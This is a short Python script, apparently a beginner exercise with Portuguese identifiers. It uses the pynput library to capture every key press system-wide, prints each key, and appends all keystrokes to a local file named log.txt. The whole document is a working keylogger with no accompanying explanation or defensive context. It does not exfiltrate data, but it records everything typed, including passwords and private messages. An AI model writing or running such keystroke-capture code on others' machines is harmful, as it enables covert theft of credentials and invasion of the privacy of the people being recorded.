from pynput import keyboard


def tecla_pressionada(tecla):
    tecla = str(tecla)
    tecla=tecla.replace("'", "")
    tecla=tecla.replace("<65437>", "5")
    print(tecla)

    if len(tecla) > 1:
        tecla = " [{}] ".format(tecla)

    with open("log.txt", "a") as log:
        log.write(tecla)

with keyboard.Listener(on_press=tecla_pressionada) as Listener:
    Listener.join()

